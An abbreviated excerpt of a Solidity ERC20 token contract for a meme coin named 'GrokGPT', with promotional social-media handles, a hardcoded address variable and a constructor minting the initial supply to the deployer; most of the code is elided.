...
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//
//          Telegram: t.me/GrokGPT
//          Twitter:  twitter.com/GrokGPT
//
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@                                                                                                @@
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _twitter = 0x1F843dA63FF9f36930970766DF74FE8b6ADbBB74;
    address public pair;
    ...
    function _DeployGrokGPT(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGrokGPT(creator, initialSupply);
    }
}

contract ERC20ByMetadrop is ERC20Token {
    constructor() ERC20Token("GrokGPT", "GrokGPT", msg.sender, 694200000 * 10 ** 18) {
    }
}